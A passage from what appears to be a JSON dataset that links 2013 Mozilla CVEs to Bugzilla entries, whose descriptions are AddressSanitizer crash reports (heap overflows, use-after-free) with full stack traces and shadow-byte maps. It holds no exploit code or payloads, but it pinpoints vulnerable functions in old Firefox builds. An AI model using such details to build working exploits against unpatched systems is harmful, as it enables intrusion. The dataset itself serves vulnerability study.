src/layout/generic/nsViewportFrame.cpp:202 > #27 0x7f2a72090215 in PresShell::DoReflow(nsIFrame*, bool) src/layout/base/nsPresShell.cpp:7558 > #28 0x7f2a720c0a6d in PresShell::ProcessReflowCommands(bool) src/layout/base/nsPresShell.cpp:7699 > #29 0x7f2a720bf13d in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) src/layout/base/nsPresShell.cpp:3907 > #30 0x7f2a720bd4d3 in PresShell::FlushPendingNotifications(mozFlushType) src/layout/base/nsPresShell.cpp:3757 > #31 0x7f2a71eb687f in nsDocumentViewer::LoadComplete(tag_nsresult) src/layout/base/nsDocumentViewer.cpp:990 > #32 0x7f2a7a48bb7e in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, tag_nsresult) src/docshell/base/nsDocShell.cpp:6514 > #33 0x7f2a7a48344b in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) src/docshell/base/nsDocShell.cpp:6342 > #34 0x7f2a7a4843cb in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) src/docshell/base/nsDocShell.cpp:6349 > #35 0x7f2a7a59707f in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, tag_nsresult) src/uriloader/base/nsDocLoader.cpp:1305 > #36 0x7f2a7a594632 in nsDocLoader::doStopDocumentLoad(nsIRequest*, tag_nsresult) src/uriloader/base/nsDocLoader.cpp:885 > #37 0x7f2a7a58d8fe in nsDocLoader::DocLoaderIsEmpty(bool) src/uriloader/base/nsDocLoader.cpp:775 > #38 0x7f2a7a591f95 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) src/uriloader/base/nsDocLoader.cpp:659 > #39 0x7f2a7a5937cb in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) src/uriloader/base/nsDocLoader.cpp:663 > #40 0x7f2a6ff667c1 in nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, tag_nsresult) src/netwerk/base/src/nsLoadGroup.cpp:676 > #41 0x7f2a73ae0290 in nsDocument::DoUnblockOnload() src/content/base/src/nsDocument.cpp:7361 > #42 0x7f2a73adfe41 in nsDocument::UnblockOnload(bool) src/content/base/src/nsDocument.cpp:7303 > #43 0x7f2a73a88cb3 in nsDocument::DispatchContentLoadedEvents() src/content/base/src/nsDocument.cpp:4280 > #44 0x7f2a73b83272 in nsRunnableMethodImpl<void (nsDocument::*)(), true>::Run() src/../../../dist/include/nsThreadUtils.h:367 > #45 0x7f2a7f4d1c3f in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:627 > #46 0x7f2a7f146495 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:237 > #47 0x7f2a7cb7cadc in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 > #48 0x7f2a7f7c35f2 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:215 > #49 0x7f2a7f7c3429 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:208 > #50 0x7f2a7f7c32fe in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:182 > #51 0x7f2a7bf6f317 in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 > #52 0x7f2a7aa9b575 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:288 > #53 0x7f2a6fce5284 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3823 > #54 0x7f2a6fceae6a in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3890 > #55 0x7f2a6fcedc30 in XRE_main src/toolkit/xre/nsAppRunner.cpp:4088 > #56 0x41dad6 in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 > #57 0x41b2f0 in main src/browser/app/nsBrowserApp.cpp:279 > #58 0x7f2a90abb76c in >0x7f2a4ada32cc is located 0 bytes to the right of 204-byte region [0x7f2a4ada3200,0x7f2a4ada32cc) >allocated by thread T0 here: > #0 0x40fbd2 in __interceptor_malloc > #1 0x7f2a91ad8604 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 > #2 0x7f2a7fc567c8 in operator new[](unsigned long) src/../../dist/include/mozilla/mozalloc.h:212 > #3 0x7f2a7fc567c8 in gfxSkipChars::BuildShortcuts() src/gfx/thebes/gfxSkipChars.cpp:25 > #4 0x7f2a7fb582bf in gfxSkipChars::TakeFrom(gfxSkipChars*) src/gfx/thebes/gfxSkipChars.h:106 > #5 0x7f2a7fb57af3 in gfxTextRun::gfxTextRun(gfxTextRunFactory::Parameters const*, unsigned int, gfxFontGroup*, unsigned int) src/gfx/thebes/gfxFont.cpp:4568 > #6 0x7f2a7fb3a5db in gfxTextRun::Create(gfxTextRunFactory::Parameters const*, unsigned int, gfxFontGroup*, unsigned int) src/gfx/thebes/gfxFont.cpp:4551 > #7 0x7f2a7fb3dc84 in gfxFontGroup::MakeTextRun(unsigned char const*, unsigned int, gfxTextRunFactory::Parameters const*, unsigned int) src/gfx/thebes/gfxFont.cpp:3592 > #8 0x7f2a72840dab in gfxTextRun* MakeTextRun<unsigned char>(unsigned char const*, unsigned int, gfxFontGroup*, gfxTextRunFactory::Parameters const*, unsigned int) src/layout/generic/nsTextFrameThebes.cpp:555 > #9 0x7f2a72835bc5 in BuildTextRunsScanner::BuildTextRunForFrames(void*) src/layout/generic/nsTextFrameThebes.cpp:2052 > #10 0x7f2a7282ab47 in BuildTextRunsScanner::FlushFrames(bool, bool) src/layout/generic/nsTextFrameThebes.cpp:1411 > #11 0x7f2a7283a6fe in BuildTextRunsScanner::ScanFrame(nsIFrame*) src/layout/generic/nsTextFrameThebes.cpp:1603 > #12 0x7f2a7283b145 in BuildTextRunsScanner::ScanFrame(nsIFrame*) src/layout/generic/nsTextFrameThebes.cpp:1643 > #13 0x7f2a7284e807 in BuildTextRuns(gfxContext*, nsTextFrame*, nsIFrame*, nsLineList_iterator const*, nsTextFrame::TextRunType) src/layout/generic/nsTextFrameThebes.cpp:1314 > #14 0x7f2a72849f2c in nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, gfxContext*, nsIFrame*, nsLineList_iterator const*, unsigned int*) src/layout/generic/nsTextFrameThebes.cpp:2468 > #15 0x7f2a728d4339 in nsTextFrame::ReflowText(nsLineLayout&, int, nsRenderingContext*, bool, nsHTMLReflowMetrics&, unsigned int&) src/layout/generic/nsTextFrameThebes.cpp:7816 > #16 0x7f2a726cfc69 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) src/layout/generic/nsLineLayout.cpp:847 > #17 0x7f2a7269fc7d in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) src/layout/generic/nsInlineFrame.cpp:680 > #18 0x7f2a7269cc36 in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:543 > #19 0x7f2a72699856 in nsInlineFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:395 > #20 0x7f2a726cf77d in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) src/layout/generic/nsLineLayout.cpp:840 > #21 0x7f2a7238d9b2 in nsBlockFrame::ReflowInlineFrame(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) src/layout/generic/nsBlockFrame.cpp:3725 > #22 0x7f2a72387fd6 in nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) src/layout/generic/nsBlockFrame.cpp:3522 > #23 0x7f2a7237abea in nsBlockFrame::ReflowInlineFrames(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3376 > #24 0x7f2a72369ecb in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2483 > #25 0x7f2a72350be8 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:2000 > #26 0x7f2a72343dd4 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1043 > #27 0x7f2a723d2921 in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) src/layout/generic/nsBlockReflowContext.cpp:268 > #28 0x7f2a72374ec6 in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3101 > #29 0x7f2a72369bea in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2480 > #30 0x7f2a72350be8 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:2000 >Shadow bytes around the buggy address: > 0x1fe5495b4600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1fe5495b4610: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1fe5495b4620: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1fe5495b4630: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1fe5495b4640: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >=>0x1fe5495b4650: 00 00 00 00 00 00 00 00 00[04]fb fb fb fb fb fb > 0x1fe5495b4660: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb > 0x1fe5495b4670: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb > 0x1fe5495b4680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1fe5495b4690: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1fe5495b46a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa >Shadow byte legend (one shadow byte represents 8 application bytes): > Addressable: 00 > Partially addressable: 01 02 03 04 05 06 07 > Heap left redzone: fa > Heap righ redzone: fb > Freed Heap region: fd > Stack left redzone: f1 > Stack mid redzone: f2 > Stack right redzone: f3 > Stack partial redzone: f4 > Stack after return: f5 > Stack use after scope: f8 > Global redzone: f9 > Global init order: f6 > Poisoned by user: f7 > ASan internal: fe >Stats: 250M malloced (538M for red zones) by 403569 calls >Stats: 47M realloced by 24065 calls >Stats: 225M freed by 283304 calls >Stats: 113M really freed by 208600 calls >Stats: 612M (612M-0M) mmaped; 153 maps, 0 unmaps > mmaps by size class: 10:253890; 11:12282; 12:3072; 13:1536; 14:1280; 15:256; 16:1152; 17:1280; 18:48; 19:40; 20:24; > mallocs by size class: 10:374083; 11:19834; 12:2763; 13:1873; 14:1627; 15:435; 16:1456; 17:1366; 18:70; 19:40; 20:22; > frees by size class: 10:258335; 11:17089; 12:1638; 13:1639; 14:1453; 15:310; 16:1376; 17:1349; 18:58; 19:38; 20:19; > rfrees by size class: 10:193497; 11:10852; 12:866; 13:748; 14:834; 15:188; 16:977; 17:607; 18:26; 19:4; 20:1; >Stats: malloc large: 1498 small slow: 4502 >Stats: StackDepot: 0 ids; 0M mapped >==20823== ABORTING >"
      }
    ],
    "CVE-2013-1678": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=839745",
        "title": "Invalid write in _cairo_xlib_surface_add_glyph",
        "description": ">==10987== ERROR: AddressSanitizer: unknown-crash on address 0x60920001abfc at pc 0x411d13 bp 0x7fffcc9bcb00 sp 0x7fffcc9bcad8 >WRITE of size 8 at 0x60920001abfc thread T0 > #0 0x411d12 in __interceptor_memmove > #1 0x7f85d2e03e8d in > #2 0x7f85d7d44ab5 in _cairo_xlib_surface_add_glyph src/gfx/cairo/cairo/src/cairo-xlib-surface.c:4321 > #3 0x7f85d7d44ab5 in _cairo_xlib_surface_emit_glyphs src/gfx/cairo/cairo/src/cairo-xlib-surface.c:4577 > #4 0x7f85d7d44ab5 in _cairo_xlib_surface_show_glyphs src/gfx/cairo/cairo/src/cairo-xlib-surface.c:4904 > #5 0x7f85d7ccd8ff in _cairo_surface_show_text_glyphs src/gfx/cairo/cairo/src/cairo-surface.c:2763 > #6 0x7f85d7c5a40c in _cairo_gstate_show_text_glyphs src/gfx/cairo/cairo/src/cairo-gstate.c:1998 > #7 0x7f85d7c2d056 in _moz_cairo_show_glyphs src/gfx/cairo/cairo/src/cairo.c:3523 > #8 0x7f85d796b3d8 in GlyphBuffer::Flush(_cairo*, gfxFont::DrawMode, bool, gfxTextObjectPaint*, gfxMatrix const&, bool) src/gfx/thebes/gfxFont.cpp:1576 > #9 0x7f85d79680f7 in gfxFont::Draw(gfxTextRun*, unsigned int, unsigned int, gfxContext*, gfxFont::DrawMode, gfxPoint*, gfxFont::Spacing*, gfxTextObjectPaint*) src/gfx/thebes/gfxFont.cpp:1967 > #10 0x7f85d797ec4b in gfxTextRun::DrawGlyphs(gfxFont*, gfxContext*, gfxFont::DrawMode, gfxPoint*, gfxTextObjectPaint*, unsigned int, unsigned int, gfxTextRun::PropertyProvider*, unsigned int, unsigned int) src/gfx/thebes/gfxFont.cpp:4950 > #11 0x7f85d797fe06 in gfxTextRun::Draw(gfxContext*, gfxPoint, gfxFont::DrawMode, unsigned int, unsigned int, gfxTextRun::PropertyProvider*, double*, gfxTextObjectPaint*, gfxTextRun::DrawCallbacks*) src/gfx/thebes/gfxFont.cpp:5151 > #12 0x7f85d5eea3ea in nsSVGGlyphFrame::DrawCharacters(CharacterIterator*, gfxContext*, gfxFont::DrawMode, gfxTextObjectPaint*) src/layout/svg/nsSVGGlyphFrame.cpp:613 > #13 0x7f85d5ee9d4d in nsSVGGlyphFrame::PaintSVG(nsRenderingContext*, nsIntRect const*) src/layout/svg/nsSVGGlyphFrame.cpp:441 > #14 0x7f85d5ee7fc9 in nsDisplaySVGGlyphs::Paint(nsDisplayListBuilder*, nsRenderingContext*) src/layout/svg/nsSVGGlyphFrame.cpp:254 > #15 0x7f85d4301d3c in mozilla::FrameLayerBuilder::DrawThebesLayer(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*) src/layout/base/FrameLayerBuilder.cpp:3341 > #16 0x7f85d7a25232 in PaintBuffer src/gfx/layers/basic/BasicThebesLayer.h:94 > #17 0x7f85d7a25232 in mozilla::layers::BasicShadowableThebesLayer::PaintBuffer(gfxContext*, nsIntRegion const&, nsIntRegion const&, nsIntRegion const&, bool, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*) src/gfx/layers/basic/BasicThebesLayer.cpp:400 > #18 0x7f85d7a21b9e in mozilla::layers::BasicThebesLayer::PaintThebes(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) src/gfx/layers/basic/BasicThebesLayer.cpp:187 > #19 0x7f85d7a2472b in mozilla::layers::BasicShadowableThebesLayer::PaintThebes(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) src/gfx/layers/basic/BasicThebesLayer.cpp:301 > #20 0x7f85d7a02b35 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) src/gfx/layers/basic/BasicLayerManager.cpp:819 > #21 0x7f85d7a005fa in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) src/gfx/layers/basic/BasicLayerManager.cpp:934 > #22 0x7f85d7a02975 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) src/gfx/layers/basic/BasicLayerManager.cpp:835 > #23 0x7f85d7a005fa in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) src/gfx/layers/basic/BasicLayerManager.cpp:934 > #24 0x7f85d7a02975 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) src/gfx/layers/basic/BasicLayerManager.cpp:835 > #25 0x7f85d7a005fa in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) src/gfx/layers/basic/BasicLayerManager.cpp:934 > #26 0x7f85d79fd825 in mozilla::layers::BasicLayerManager::EndTransactionInternal(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) src/gfx/layers/basic/BasicLayerManager.cpp:590 > #27 0x7f85d7a06125 in EndTransaction src/gfx/layers/basic/BasicLayerManager.cpp:509 > #28 0x7f85d7a06125 in mozilla::layers::BasicShadowLayerManager::EndTransaction(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) src/gfx/layers/basic/BasicLayerManager.cpp:1144 > #29 0x7f85d43c4970 in nsDisplayList::PaintForFrame(nsDisplayListBuilder*, nsRenderingContext*, nsIFrame*, unsigned int) const src/layout/base/nsDisplayList.cpp:1168 > #30 0x7f85d43c36db in nsDisplayList::PaintRoot(nsDisplayListBuilder*, nsRenderingContext*, unsigned int) const src/layout/base/nsDisplayList.cpp:1030 > #31 0x7f85d443df42 in nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, unsigned int) src/layout/base/nsLayoutUtils.cpp:2014 > #32 0x7f85d449d7d7 in PresShell::Paint(nsView*, nsRegion const&, unsigned int) src/layout/base/nsPresShell.cpp:5414 > #33 0x7f85d5500bcb in nsViewManager::ProcessPendingUpdatesForView(nsView*, bool) src/view/src/nsViewManager.cpp:399 > #34 0x7f85d44bc175 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) src/layout/base/nsRefreshDriver.cpp:955 > #35 0x7f85d44beaf3 in TickDriver src/layout/base/nsRefreshDriver.cpp:164 > #36 0x7f85d44beaf3 in mozilla::RefreshDriverTimer::Tick() src/layout/base/nsRefreshDriver.cpp:156 > #37 0x7f85d784b194 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:482 > #38 0x7f85d784b762 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:565 > #39 0x7f85d783fdee in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:627 > #40 0x7f85d7777ce2 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:238 > #41 0x7f85d6f00bec in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 > #42 0x7f85d78d1aa8 in RunInternal src/ipc/chromium/src/base/message_loop.cc:215 > #43 0x7f85d78d1aa8 in RunHandler src/ipc/chromium/src/base/message_loop.cc:208 > #44 0x7f85d78d1aa8 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:182 > #45 0x7f85d6bf69dd in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 > #46 0x7f85d6679340 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:288 > #47 0x7f85d3bb93ac in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3826 > #48 0x7f85d3bba23f in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3893 > #49 0x7f85d3bbb201 in XRE_main src/toolkit/xre/nsAppRunner.cpp:4096 > #50 0x41fd9b in do_main src/browser/app/nsBrowserApp.cpp:185 > #51 0x41fd9b in main src/browser/app/nsBrowserApp.cpp:377 > #52 0x7f85dd8d276c in > #53 0x41f114 in >0x60920001ac00 is located 0 bytes to the right of 16384-byte region [0x609200016c00,0x60920001ac00) >allocated by thread T0 here: > #0 0x413e83 in __interceptor_calloc > #1 0x7f85d1e5ee2d in >Shadow bytes around the buggy address: > 0x1c1240003520: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 > 0x1c1240003530: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 > 0x1c1240003540: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 > 0x1c1240003550: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 > 0x1c1240003560: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >=>0x1c1240003570: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00[00] > 0x1c1240003580:fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1c1240003590: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1c12400035a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1c12400035b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1c12400035c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa >Shadow byte legend (one shadow byte represents 8 application bytes): > Addressable: 00 > Partially addressable: 01 02 03 04 05 06 07 > Heap left redzone: fa > Heap righ redzone: fb > Freed Heap region: fd > Stack left redzone: f1 > Stack mid redzone: f2 > Stack right redzone: f3 > Stack partial redzone: f4 > Stack after return: f5 > Stack use after scope: f8 > Global redzone: f9 > Global init order: f6 > Poisoned by user: f7 > ASan internal: fe >==10987== ABORTING > >"
      }
    ],
    "CVE-2013-1679": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=848237",
        "title": "Heap-use-after-free in mozilla::plugins::child::_geturlnotify",
        "description": "================================================================= ==24578== ERROR: AddressSanitizer: heap-use-after-free on address 0x600e0000f6a8 at pc 0x7fb7fe7fe517 bp 0x7fffb031f0f0 sp 0x7fffb031f0e8 WRITE of size 8 at 0x600e0000f6a8 thread T0 #0 0x7fb7fe7fe516 in mozilla::plugins::child::_geturlnotify(_NPP*, char const*, char const*, void*) src/../../../dist/include/mozilla/plugins/StreamNotifyChild.h:32 #1 0x7fb7ee257bea in #2 0x7fb7ee11e561 in #3 0x7fb7ee1564c2 in #4 0x7fb7ee0ba021 in #5 0x7fb7ee0ef4ea in #6 0x7fb7ee0efbd9 in #7 0x7fb7ee2ab585 in #8 0x7fb7ee254f54 in #9 0x7fb7f87a491a in #10 0x7fb7f87a3d52 in #11 0x7fb7f87a409f in #12 0x7fb7f87a4163 in #13 0x7fb7ff21004a in base::MessagePumpForUI::RunWithDispatcher(base::MessagePump::Delegate*, base::MessagePumpForUI::Dispatcher*) src/ipc/chromium/src/base/message_pump_glib.cc:195 #14 0x7fb7ff1d0b09 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:216 #15 0x7fb7fb8c9e89 in XRE_InitChildProcess src/toolkit/xre/nsEmbedFunctions.cpp:494 #16 0x42435d in main src/ipc/app/MozillaRuntimeMain.cpp:48 #17 0x7fb7f9f2976c in #18 0x424264 in 0x600e0000f6a8 is located 56 bytes inside of 72-byte region [0x600e0000f670,0x600e0000f6b8) freed by thread T0 here: #0 0x4180d2 in __interceptor_free #1 0x7fb7fe7e5ecc in mozilla::plugins::PluginInstanceChild::DeallocPStreamNotify(mozilla::plugins::PStreamNotifyChild*) src/dom/plugins/ipc/PluginInstanceChild.cpp:2406 #2 0x7fb7fe9bf9fb in mozilla::plugins::PPluginInstanceChild::CallPStreamNotifyConstructor(mozilla::plugins::PStreamNotifyChild*, nsCString const&, nsCString const&, bool const&, nsCString const&, bool const&, short*) src/objdir-ff-asan/ipc/ipdl/PPluginInstanceChild.cpp:821 #3 0x7fb7fe7fe37b in mozilla::plugins::child::_geturlnotify(_NPP*, char const*, char const*, void*) src/dom/plugins/ipc/PluginModuleChild.cpp:1055 #4 0x7fb7ee257bea in previously allocated by thread T0 here: #0 0x4181b2 in __interceptor_malloc #1 0x7fb80383e418 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 #2 0x7fb7ee257bea in Shadow bytes around the buggy address: 0x0c023fff9e80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c023fff9e90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c023fff9ea0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c023fff9eb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c023fff9ec0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd =>0x0c023fff9ed0: fd fd fd fd fd[fd]fd fa fa fa fa fa 00 00 00 00 0x0c023fff9ee0: 00 00 00 00 00 fa fa fa fa fa fd fd fd fd fd fd 0x0c023fff9ef0: fd fd fd fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c023fff9f00: 00 fa fa fa fa fa 00 00 00 00 00 00 00 00 00 fa 0x0c023fff9f10: fa fa fa fa 00 00 00 00 00 00 00 00 00 fa fa fa 0x0c023fff9f20: fa fa fd fd fd fd fd fd fd fd fd fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap righ redzone: fb Freed Heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==24578== ABORTING"
      }
    ],
    "CVE-2013-1680": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=850931",
        "title": "Heap-use-after-free in nsFrameList::FirstChild",
        "description": ">==16813== ERROR: AddressSanitizer: heap-use-after-free on address 0x6004001e15b0 at pc 0x7f805347f8ae bp 0x7fffc90887b0 sp 0x7fffc90887a8 >READ of size 8 at 0x6004001e15b0 thread T0 > #0 0x7f805347f8ad in nsFrameList::FirstChild() const src/../../../dist/include/nsFrameList.h:229 > #1 0x7f8053cbba5e in nsOverflowContinuationTracker::Finish(nsIFrame*) src/layout/generic/nsContainerFrame.cpp:1745 > #2 0x7f8053c61fec in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) src/layout/generic/nsBlockReflowContext.cpp:304 > #3 0x7f8053c0aba2 in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3090 > #4 0x7f8053c004b7 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2501 > #5 0x7f8053be9ce6 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:2023 > #6 0x7f8053bdd3fa in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1067 > #7 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #8 0x7f8053c9ee3d in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) src/layout/generic/nsColumnSetFrame.cpp:671 > #9 0x7f8053ca613f in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsColumnSetFrame.cpp:1045 > #10 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #11 0x7f8053cbe4da in nsContainerFrame::ReflowOverflowContainerChildren(nsPresContext*, nsHTMLReflowState const&, nsOverflowAreas&, unsigned int, unsigned int&) src/layout/generic/nsContainerFrame.cpp:1148 > #12 0x7f8053bdced2 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1042 > #13 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > 